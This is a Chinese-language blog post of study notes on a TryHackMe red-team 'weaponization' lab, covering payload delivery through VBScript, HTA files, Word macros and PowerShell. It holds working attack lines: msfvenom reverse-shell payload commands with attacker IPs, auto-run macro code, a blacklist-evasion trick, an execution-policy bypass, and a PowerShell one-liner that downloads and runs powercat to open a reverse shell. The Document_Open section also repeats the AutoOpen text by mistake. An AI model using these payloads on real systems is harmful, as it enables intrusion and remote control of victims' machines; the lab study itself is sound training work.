<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Red Team Weaponization | Zhi的筆記部落格</title>
  <meta name="author" content="Zhi">
  
  <meta name="description" content="紅隊武器化-tryhackme">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Red Team Weaponization"/>
  <meta property="og:site_name" content="Zhi的筆記部落格"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Zhi的筆記部落格" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.1.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Zhi的筆記部落格</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>歷程
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>分類
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>標籤
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>關於Zhi
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Red Team Weaponization</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  
		 <div class="alert alert-success description">
			<i class="fa fa-info-circle"></i> 紅隊武器化-tryhackme
		 </div> <!-- alert -->
	  		

	  <h1 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h1><h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><blockquote>
<p>武器化是網路殺傷鏈模型的第二階段。在此階段，攻擊者使用可交付的有效負載（例如 Word 文件、PDF 等）來產生並開發自己的惡意程式碼。武器化階段旨在使用惡意武器來利用目標機器並獲得初始存取權。<br>大多數組織都運行 Windows 作業系統，這將成為可能的目標。組織的環境策略通常會阻止下載和執行 .exe檔以避免安全性違規。因此，紅隊成員依賴建立透過各種管道發送的自訂有效負載，例如網路釣魚活動、社會工程、瀏覽器或軟體開發、USB 或 Web 方法。</p>
</blockquote>
<blockquote>
<p>大多數組織都會阻止或監視其受控環境中.exe檔的執行 。因此，紅隊成員依賴使用其他技術執行有效負載，例如內建 Windows 腳本技術</p>
</blockquote>
<blockquote>
<ul>
<li>Windows 腳本宿主 (WSH)</li>
<li>HTML 應用程式 ( HTA )</li>
<li>可視化基本應用程式 (VBA)</li>
<li>PowerShell（PSH）</li>
</ul>
</blockquote>
<h2 id="紅隊工具包"><a href="#紅隊工具包" class="headerlink" title="紅隊工具包"></a>紅隊工具包</h2><h3 id="網址"><a href="#網址" class="headerlink" title="網址"></a>網址</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">紅隊工具包</a></p>
</blockquote>
<h2 id="部署Windows機器"><a href="#部署Windows機器" class="headerlink" title="部署Windows機器"></a>部署Windows機器</h2><blockquote>
<p>xfreerdp &#x2F;v:10.10.234.142 &#x2F;u:thm &#x2F;p:TryHackM3 +clipboard<br>使用者名稱：  thm  密碼 ：  TryHackM3 </p>
</blockquote>
<h2 id="Windows-腳本宿主-WSH"><a href="#Windows-腳本宿主-WSH" class="headerlink" title="Windows 腳本宿主 - WSH"></a>Windows 腳本宿主 - WSH</h2><h3 id="簡單腳本編寫-VBScript"><a href="#簡單腳本編寫-VBScript" class="headerlink" title="簡單腳本編寫(VBScript)"></a>簡單腳本編寫(VBScript)</h3><h4 id="显示“Welcome-to-THM”消息的-Windows-消息框"><a href="#显示“Welcome-to-THM”消息的-Windows-消息框" class="headerlink" title="显示“Welcome to THM”消息的 Windows 消息框"></a>显示“Welcome to THM”消息的 Windows 消息框</h4><blockquote>
<p>编写一个简单的 VBScript 代码，用于创建一个显示“Welcome to THM”消息的 Windows 消息框</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim message</span><br><span class="line">message=&quot;welcome to htm&quot;</span><br><span class="line">MsgBox message</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在第一行中，我们使用 Dim 声明了一个名为 message 的变量。然后我们在 message 变量中存储了一个字符串值 “Welcome to THM”。在下一行中，我们使用 MsgBox 函数来显示变量的内容。然后，我们使用 wscript 来运行和执行 hello.vbs 的内容。结果，将会弹出一个带有 “Welcome to THM” 消息的 Windows 消息框。</p>
</blockquote>
<h4 id="Windows-原生引擎（WSH）执行-exe-文件"><a href="#Windows-原生引擎（WSH）执行-exe-文件" class="headerlink" title="Windows 原生引擎（WSH）执行 .exe 文件"></a>Windows 原生引擎（WSH）执行 .exe 文件</h4><blockquote>
<p>VBScript 代码用于调用 Windows 计算器為例</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set shell = WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">shell.Run(&quot;C:\\Windows\\System32\\calc.exe&quot;), 0, True</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Set shell &#x3D; WScript.CreateObject(“WScript.Shell”)<br>这行代码创建了一个 WScript.Shell 对象，并将其赋值给变量 shell。WScript.Shell 是一个提供访问操作系统 shell 的对象。<br>shell.Run(“C:\Windows\System32\calc.exe”), 0, True<br>这行代码使用 shell 对象的 Run 方法来执行系统的计算器程序。<br>“C:\Windows\System32\calc.exe” 是计算器程序的完整路径，使用双反斜线 (\) 是因为在 VBScript 字符串中，单反斜线 () 作为转义字符的引导，所以路径分隔符需要用两个反斜线表示。<br>0 是 Run 方法的第二个参数，表示窗口的显示方式。在这个上下文中，0 表示隐藏窗口，但由于计算器是图形界面程序，它将正常显示。<br>True 是 Run 方法的第三个参数，它决定了 VBScript 是否应该等待程序执行完成才继续执行下一行代码。True 表示 VBScript 会等待计算器关闭，才继续执行。</p>
</blockquote>
<h4 id="VBS-文件被列入黑名单處理方式"><a href="#VBS-文件被列入黑名单處理方式" class="headerlink" title="VBS 文件被列入黑名单處理方式"></a>VBS 文件被列入黑名单處理方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这行命令使用 wscript，即 Windows Script Host 的图形版本，来执行一个重命名为 .txt 扩展名的 VBScript 脚本。通常，VBScript 脚本会以 .vbs 扩展名保存，但如果 .vbs 文件被系统的安全策略或防病毒软件列入黑名单，将文件扩展名更改为 .txt 可能是一种绕过这些限制的技巧。<br>命令的各部分含义如下：<br>wscript：执行 Windows 脚本宿主，提供用户界面（图形界面），用于运行脚本。<br>&#x2F;e:VBScript：这个参数告诉 wscript 使用 VBScript 引擎执行后面指定的脚本文件。&#x2F;e 参数用于指定要用于处理脚本的脚本引擎。<br>c:\Users\thm\Desktop\payload.txt：这是 VBScript 脚本文件的路径，位于用户 thm 的桌面上，文件名为 payload.txt。</p>
</blockquote>
<h2 id="HTML-應用程式-HTA"><a href="#HTML-應用程式-HTA" class="headerlink" title="HTML 應用程式 - HTA"></a>HTML 應用程式 - HTA</h2><h3 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
<p>HTA 代表“HTML 应用程序”。它允许你创建一个可下载的文件，该文件包含所有关于如何显示和渲染的信息。HTML 应用程序，也称为 HTAs，是包含 JScript 和 VBScript 的动态 HTML 页面。LOLBINS（活在土地上的二进制文件）工具 mshta 用于执行 HTA 文件。它可以自己执行，也可以通过 Internet Explorer 自动执行。<br>HTML应用程序（HTA）是一种微软的程序文件，它结合了网页设计语言HTML的灵活性和Windows应用程序的功能性。HTA文件是使用HTML和脚本语言（如VBScript或JScript）编写的，通常保存为.hta扩展名。与普通的网页不同，HTA在“受信任的”模式下运行，这意味着它们具有更多的权限，可以访问系统上的文件和设置等资源。<br>LOLBINS（活在土地上的二进制文件）指的是合法的系统工具，它们可以被用于恶意目的。mshta是一个LOLBIN，它可以用来执行HTA文件。mshta可以独立执行，也可以作为Internet Explorer的一部分自动执行。<br>在提到的示例中，ActiveXObject 是在 HTA 中用来创建和操作 COM 对象的机制。COM（组件对象模型）允许Windows组件进行交互，而 ActiveXObject 可以在 HTA 或浏览器中创建这些组件的实例。</p>
</blockquote>
<h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><blockquote>
<p>将在有效载荷中使用 ActiveXObject 作为概念验证来执行 cmd.exe</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var c= &#x27;cmd.exe&#x27;</span><br><span class="line">	new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(c);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从 Web 服务器提供 payload.hta 文件,可執行以下程式碼開啟測試伺服器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8090</span><br></pre></td></tr></table></figure>

<h3 id="hta反向連接"><a href="#hta反向連接" class="headerlink" title="hta反向連接"></a>hta反向連接</h3><h4 id="生成腳本"><a href="#生成腳本" class="headerlink" title="生成腳本"></a>生成腳本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta</span><br></pre></td></tr></table></figure>
<blockquote>
<p>msfvenom：这是 Metasploit 框架的一部分，用于生成自定义恶意载荷。<br>-p windows&#x2F;x64&#x2F;shell_reverse_tcp：指定载荷类型。这里 -p 代表 “payload”，windows&#x2F;x64&#x2F;shell_reverse_tcp 是一个针对 Windows 64位系统的反向 TCP shell 载荷，当执行时会尝试从目标机器连接回攻击者指定的 IP 地址和端口。<br>LHOST&#x3D;10.8.232.37：指定监听主机的 IP 地址（即攻击者的 IP 地址）。这是反向连接将会连接回的地址。<br>LPORT&#x3D;443：指定监听端口。这是反向连接将会连接回的端口。在这个例子中，使用了 HTTPS 默认的端口号 443。<br>-f hta-psh：指定输出格式。这里 -f 代表 “format”，hta-psh 表示输出为 HTML 应用程序（HTA）文件，该文件将包含一个 PowerShell 脚本来执行 shell。<br>-o thm.hta：指定输出文件的名称和位置。这里 -o 代表 “output”，thm.hta 是文件的名称。</p>
</blockquote>
<h4 id="啟用監聽"><a href="#啟用監聽" class="headerlink" title="啟用監聽"></a>啟用監聽</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvp 443</span><br></pre></td></tr></table></figure>

<h2 id="Visual-Basic-應用程式-VBA"><a href="#Visual-Basic-應用程式-VBA" class="headerlink" title="Visual Basic 應用程式 - VBA"></a>Visual Basic 應用程式 - VBA</h2><h3 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
<p>VBA代表Visual Basic for Applications，這是一種由Microsoft實施的程式設計語言，用於諸如Microsoft Word、Excel、PowerPoint等Microsoft應用程序。VBA編程允許自動化用戶與Microsoft Office應用程序之間幾乎所有鍵盤和鼠標互動的任務。</p>
</blockquote>
<h3 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h3><blockquote>
<p>打開word開啟新文件→view→macros<br><img src="/photo/Red_Team_Weaponization/31.jpg" alt="31"><br><img src="/photo/Red_Team_Weaponization/32.jpg" alt="32"><br>打上名稱後按ENTER，在中間框中打入程式，例如</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="/photo/Red_Team_Weaponization/33.jpg" alt="33"><br>按下執行<br><img src="/photo/Red_Team_Weaponization/34.jpg" alt="34"></p>
</blockquote>
<h3 id="Microsoft-Word-文檔打開時自動執行"><a href="#Microsoft-Word-文檔打開時自動執行" class="headerlink" title="Microsoft Word 文檔打開時自動執行"></a>Microsoft Word 文檔打開時自動執行</h3><blockquote>
<p>希望在 Microsoft Word 文檔打開時自動執行某些動作時，可以利用特定的事件處理函數來實現這一點。常用的兩個事件處理函數是 AutoOpen 和 Document_Open。</p>
</blockquote>
<h4 id="AutoOpen"><a href="#AutoOpen" class="headerlink" title="AutoOpen"></a>AutoOpen</h4><blockquote>
<p>AutoOpen 是一個在 Word 文檔打開時自動被調用的傳統宏。當任何文檔被打開時，如果文檔或其模板中存在名為 AutoOpen 的宏，Word 將自動執行它。</p>
</blockquote>
<h4 id="Document-Open"><a href="#Document-Open" class="headerlink" title="Document_Open"></a>Document_Open</h4><blockquote>
<p>AutoOpen 是一個在 Word 文檔打開時自動被調用的傳統宏。當任何文檔被打開時，如果文檔或其模板中存在名為 AutoOpen 的宏，Word 將自動執行它。</p>
</blockquote>
<h4 id="示範-1"><a href="#示範-1" class="headerlink" title="示範"></a>示範</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<blockquote>
<p>要使宏正常工作，我們需要將文件保存為支持宏的格式，例如 .doc 和 .docm。現在，讓我們將文件保存為啟用宏的 Word 97-2003 模板，方法是前往「檔案」→「保存Document1」，然後在「另存為類型」中選擇「Word 97-2003 文檔」，最後保存。<br>當每次重啟word時都會執行此程式<br><img src="/photo/Red_Team_Weaponization/36.jpg" alt="36"></p>
</blockquote>
<h3 id="Microsoft-Word-文檔打開時自動執行程式"><a href="#Microsoft-Word-文檔打開時自動執行程式" class="headerlink" title="Microsoft Word 文檔打開時自動執行程式"></a>Microsoft Word 文檔打開時自動執行程式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">	Dim payload As String</span><br><span class="line">	payload = &quot;calc.exe&quot;</span><br><span class="line">	CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Sub PoC()：這一行定義了一個名為 PoC 的新子程序。Sub 是 Subroutine（子程序）的縮寫，用於在 VBA 中定義一個程序塊，可以在其他地方被調用。<br>Dim payload As String：這行代碼使用 Dim 關鍵字來聲明一個名為 payload 的變量，類型為 String（字符串）。這裡，payload 將用來存儲要執行的命令或文件名。<br>payload &#x3D; “calc.exe”：將字符串 “calc.exe” 賦值給變量 payload。這表示 payload 變量將用來指向計算器應用程序的可執行文件。<br>CreateObject(“Wscript.Shell”).Run payload,0：這行代碼是實際執行操作的關鍵。它使用 CreateObject 函數創建了一個 Wscript.Shell 對象。Wscript.Shell 是一個可提供對 Windows Shell 的訪問的對象，允許 VBA 執行外部應用程序。<br>.Run payload,0 方法用於執行 payload 變量中指定的命令。在這個例子中，它執行 calc.exe，即 Windows 的計算器。<br>方法的第二個參數 0 表示計算器應用程序在背景執行，並且不顯示任何窗口。<br>End Sub：這行代碼表示子程序的結束。</p>
</blockquote>
<blockquote>
<p>後將此代碼加入AutoOpen()和Document_Open()函數裡</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">	Dim payload As String</span><br><span class="line">	payload = &quot;calc.exe&quot;</span><br><span class="line">	CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  PoC</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Document_Open()</span><br><span class="line">  PoC</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<h3 id="利用msf生成反向連接代碼並連接word"><a href="#利用msf生成反向連接代碼並連接word" class="headerlink" title="利用msf生成反向連接代碼並連接word"></a>利用msf生成反向連接代碼並連接word</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=111.250.150.71 LPORT=443 -f vba</span><br></pre></td></tr></table></figure>
<blockquote>
<p>將產生的代碼插入word中並將Workbook_Open() 改為 Document_Open()<br>原始生成的代碼是為 Microsoft Excel 設計的，因此它使用的是 Workbook_Open() 事件處理函數。這個函數是在 Excel 工作簿（Workbook）打開時觸發的。<br><img src="/photo/Red_Team_Weaponization/37.jpg" alt="37"></p>
</blockquote>
<h2 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell - PSH"></a>PowerShell - PSH</h2><h3 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
<p>PowerShell 是一種從 .NET 的動態語言運行時（DLR）執行的面向對象的編程語言，但在某些遺留用途中有所例外。紅隊成員依靠 PowerShell 執行各種活動，包括初始訪問、系統枚舉等等。</p>
</blockquote>
<h3 id="顯示-“Welcome-to-the-Weaponization-Room-”"><a href="#顯示-“Welcome-to-the-Weaponization-Room-”" class="headerlink" title="顯示 “Welcome to the Weaponization Room!”"></a>顯示 “Welcome to the Weaponization Room!”</h3><h4 id="創建腳本"><a href="#創建腳本" class="headerlink" title="創建腳本"></a>創建腳本</h4><blockquote>
<p>創建一個簡單的 PowerShell 腳本開始，該腳本將顯示 “Welcome to the Weaponization Room!”</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>將文件保存為 thm.ps1。</p>
</blockquote>
<h4 id="執行腳本"><a href="#執行腳本" class="headerlink" title="執行腳本"></a>執行腳本</h4><blockquote>
<p>在powershell裡輸入</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -File thm.ps1</span><br></pre></td></tr></table></figure>
<blockquote>
<p><img src="/photo/Red_Team_Weaponization/38.jpg" alt="38"><br>PowerShell 的執行策略是一種安全選項，用於保護系統免受惡意腳本的運行。為了安全起見，Microsoft 默認禁止執行 PowerShell 腳本（.ps1 文件）。PowerShell 的執行策略設定為「Restricted」（受限），這意味著它允許單個命令的執行，但不允許運行任何腳本。</p>
</blockquote>
<blockquote>
<p>查看powershell執行腳本設定</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br></pre></td></tr></table></figure>
<blockquote>
<p>更改設定</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</span><br><span class="line">A</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Set-ExecutionPolicy：這是用來設定 PowerShell 的執行策略的命令。<br>-Scope CurrentUser：這個選項指定命令的作用範圍僅限於當前用戶。這意味著這個政策變更只會影響當前用戶的會話和未來的會話，而不影響其他用戶。<br>RemoteSigned：這是要設定的執行策略類型。它允許執行本地創建的腳本而不需任何簽名，但要求從外部來源（例如互聯網）下載的腳本必須有一個有效的數字簽名。</p>
</blockquote>
<blockquote>
<p>數字簽名的作用<br>數字簽名用於驗證腳本的完整性和來源，確保腳本自簽名以來未被更改，並且確認腳本的作者或發佈者是信任的實體。數字簽名是利用公鑰基礎設施（PKI）技術來實現的，其中包括使用證書來證明簽名者的身份。</p>
</blockquote>
<blockquote>
<p>更改完後執行腳本<br><img src="/photo/Red_Team_Weaponization/39.jpg" alt="39"></p>
</blockquote>
<blockquote>
<p>也可用此命令繞過限制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ex bypass -File thm.ps1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>powershell：這是啟動 PowerShell 的命令。<br>-ex bypass：<br>-ex 是 -ExecutionPolicy 的縮寫，這是用來設定腳本執行策略的參數。<br>bypass 表示設置執行策略為繞過（bypass），即忽略任何執行策略的限制，允許所有 PowerShell 腳本執行。這對於測試或在受控環境中運行未簽名的腳本很有用。</p>
</blockquote>
<blockquote>
<p>-File thm.ps1：<br>-File 是一個參數，指定要執行的 PowerShell 腳本文件。<br>thm.ps1 是腳本文件的名稱，此命令告訴 PowerShell 執行當前目錄下名為 thm.ps1 的文件。</p>
</blockquote>
<h3 id="獲取反向-shell"><a href="#獲取反向-shell" class="headerlink" title="獲取反向 shell"></a>獲取反向 shell</h3><h4 id="下載powershell"><a href="#下載powershell" class="headerlink" title="下載powershell"></a>下載powershell</h4><blockquote>
<p>powercat</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure>
<blockquote>
<p>進入克隆下來的目錄</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd powercat</span><br></pre></td></tr></table></figure>
<blockquote>
<p>開啟網站伺服器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
<blockquote>
<p>監聽想要的端口</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1337</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在受害主機的powshell執行</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.212.101:8080/powercat.ps1&#x27;);powercat -c 192.168.212.101 -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>powershell：這是啟動 PowerShell 的命令。<br>-c：這個參數表示要執行的命令為一個字符串（command string）。<br>“IEX(New-Object System.Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://attackbox_ip:8080/powercat.ps1')%22%EF%BC%9A%E9%80%99%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E5%81%9A%E4%BA%86%E4%BB%A5%E4%B8%8B%E5%B9%BE%E4%BB%B6%E4%BA%8B%EF%BC%9A">http://ATTACKBOX_IP:8080/powercat.ps1&#39;)&quot;：這部分命令做了以下幾件事：</a><br>New-Object System.Net.WebClient：創建一個新的 WebClient 物件，用於從網絡上下載文件。<br>.DownloadString(‘<a target="_blank" rel="noopener" href="http://attackbox_ip:8080/powercat.ps1')%EF%BC%9A%E5%88%A9%E7%94%A8">http://ATTACKBOX_IP:8080/powercat.ps1&#39;)：利用</a> WebClient 物件從指定的 URL 下載 powercat.ps1 腳本的字符串內容。這個 URL 指向攻擊機上運行的 web 服務器，端口為 8080。<br>IEX (Invoke-Expression)：執行從網絡上下載的字符串內容作為 PowerShell 腳本。這使得下載的 powercat.ps1 腳本立即在本地執行。<br>;：這是命令分隔符，用於在一行內分隔多個 PowerShell 命令。<br>powercat -c ATTACKBOX_IP -p 1337 -e cmd：這是 powercat.ps1 腳本的一個功能，用於建立反向 shell：<br>-c ATTACKBOX_IP：指定連線目標 IP 地址，即攻擊機的 IP 地址。<br>-p 1337：指定連線目標的端口號，此例中為 1337。<br>-e cmd：指定當連線建立後，要執行的程序，這裡是 Windows 的命令提示符（cmd）。</p>
</blockquote>
<blockquote>
<p>成果<br><img src="/photo/Red_Team_Weaponization/40.jpg" alt="40"></p>
</blockquote>
<h2 id="命令與控制-（C2-或-C-C）"><a href="#命令與控制-（C2-或-C-C）" class="headerlink" title="命令與控制 -（C2 或 C&amp;C）"></a>命令與控制 -（C2 或 C&amp;C）</h2><h3 id="什麼是指揮與控制（C2）？"><a href="#什麼是指揮與控制（C2）？" class="headerlink" title="什麼是指揮與控制（C2）？"></a>什麼是指揮與控制（C2）？</h3><blockquote>
<p>C2 框架是在滲透後階段被用來允許紅隊成員合作和控制受損計算機的框架。在進行網絡攻擊行動中，C2 被認為是紅隊成員最重要的工具之一。C2 框架提供了快速而簡便的方法來進行以下幾點：</p>
</blockquote>
<ul>
<li>生成各種惡意負載<blockquote>
<p>使用 Metasploit 框架生成特定於目標系統漏洞的 Shellcode。例如，透過 msfvenom 工具生成一個針對 Windows 10 的 Meterpreter 逆向連接 shell，該 shell 能夠在被攻擊的系統上靜默執行並提供遠程控制。</p>
</blockquote>
</li>
<li>枚舉受損的計算機&#x2F;網絡<blockquote>
<p>使用 PowerShell Empire 進行內網掃描，識別網絡中的其他活動主機、開放的端口和運行的服務。這可以幫助確定進一步攻擊的潛在目標。</p>
</blockquote>
</li>
<li>執行權限提升和橋接<blockquote>
<p>如果初始的 shell 是以普通用戶權限獲得的，可以利用 Cobalt Strike 提供的各種提權 Exploit，如不當權限配置或系統漏洞，來獲得系統級別的訪問權限。</p>
</blockquote>
</li>
<li>橫向移動<blockquote>
<p>旦獲得一台機器的控制權，紅隊可以使用像是 Pass-the-Hash（PtH）攻擊技術來訪問相同網絡中的其他機器。Cobalt Strike 和 Metasploit 都提供了進行橫向移動的工具和技術，例如利用已獲得的憑證來遠程執行命令或部署惡意軟件到其他電腦上。<br>Pass-the-Hash（PtH）<br>哈希的獲得：<br>攻擊者首先需要從一台計算機上獲得用戶賬戶的哈希值。這可以通過多種方法實現，包括但不限於利用系統漏洞、惡意軟件感染或直接從系統檔案（如SAM文件）或記憶體中提取。<br>使用哈希進行身份驗證：<br>一旦獲得哈希，攻擊者可以使用這些哈希來嘗試登錄到網絡中的其他機器。在 Windows 環境中，NTLM 身份驗證過程允許使用用戶的 NTLM 哈希進行身份驗證，而不需要明文密碼。<br>訪問網絡資源：<br>  成功使用哈希進行身份驗證後，攻擊者可以訪問其他計算機、服務或資料，就如同他們擁有那些用戶的實際密碼一樣。</p>
</blockquote>
</li>
</ul>
